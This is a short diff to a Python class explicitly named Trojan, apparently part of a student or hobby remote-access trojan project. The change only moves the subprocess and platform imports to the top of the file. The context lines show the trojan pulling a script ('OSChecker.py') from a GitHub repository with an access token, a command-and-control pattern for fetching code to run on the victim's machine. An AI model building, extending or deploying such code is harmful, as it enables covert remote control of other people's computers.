@@ -2,6 +2,8 @@ from github import Github
 import json
 import time
 import base64
+import subprocess
+import platform
 
 class Trojan():
     def __init__(self, repository_name, file_path, access_token):
@@ -12,8 +14,6 @@ class Trojan():
 
     def run_OSChecker(self):
         '''This function will run automatically accordingly when we first start our trojan'''
-        from github import Github
-        import subprocess
         g = Github(self.access_token)
         repo = g.get_repo(self.repository_name)
         file_content = repo.get_contents('OSChecker.py').decoded_content.decode('utf-8')
@@ -40,7 +40,6 @@ class Trojan():
 
     def run(self):
         '''beschrijving'''
-        import platform
         try:
             my_os = platform.system()
             while True:
